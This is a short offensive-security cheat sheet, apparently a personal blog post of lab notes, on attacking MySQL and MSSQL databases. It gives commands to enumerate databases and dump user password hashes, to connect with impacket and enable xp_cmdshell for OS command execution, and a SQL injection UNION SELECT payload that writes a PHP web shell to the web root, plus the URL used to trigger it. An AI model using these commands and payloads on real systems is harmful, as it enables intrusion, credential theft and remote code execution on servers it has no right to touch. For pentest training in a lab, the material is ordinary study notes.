---
layout: post
title: SQL COMMANDS
titledate: 09/01/23
tags: ["infosec","offsec", "sql"]
---

<h4>MySQL</h4>

connect to remorte mysql database

    $ mysql -u root -p'root' -h 192.168.50.50 -P 3306

    $ select version();

return current user and hostname

    $ select system_user();

list databases

    $ show databases;

show tables in database

    $ show tables from mysql;

enter database

    $ use database;

list users

    $ SELECT user FROM mysql. user; 

list all values available to user

    $ select * from mysql.user where user = 'don';

show authentication_string of user

    $ SELECT user, authentication_string FROM mysql.user WHERE user = 'don';

showing specific value of user

    $ select plugin from mysql.user where user = 'don';


<h4>MSSQL</h4>

we can use impacket to connect to mssql on windows

    $ impacket-mssqlclient Administrator:Lab123@192.168.50.50 -windows-auth

    $ SELECT @@version;

list databases

    $ SELECT name FROM sys.databases;

we don't care about the master tempdb model and msdb databases

query tables in database we care about

    $ SELECT * FROM don.information_schema.tables;

query specific table information

    $ select * from don.dbo.users;

explore sysuers table inside master database

    $ select * from master.dbo.sysusers;

<h4>xp_cmdshell</h4>

after we connect to the db

    $ EXECUTE sp_configure 'show advanced options', 1;
    $ RECONFIGURE;
    $ EXECUTE sp_configure 'xp_cmdshell', 1;
    $ RECONFIGURE;
    $ EXECUTE xp_cmdshell 'whoami';

we can write files on the server with SELECT INTO_OUTFILE

    $ ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

here we try to use a union select to write a php web shell to /html/tmp on the server

now by entering the above statement into the form field we are injecting our webshell to the specified directory

and then in the url - we can attempt to perform the http request to our webshell with the cmd=

    http://192.168.50.50/tmp/webshell.php?cmd=id
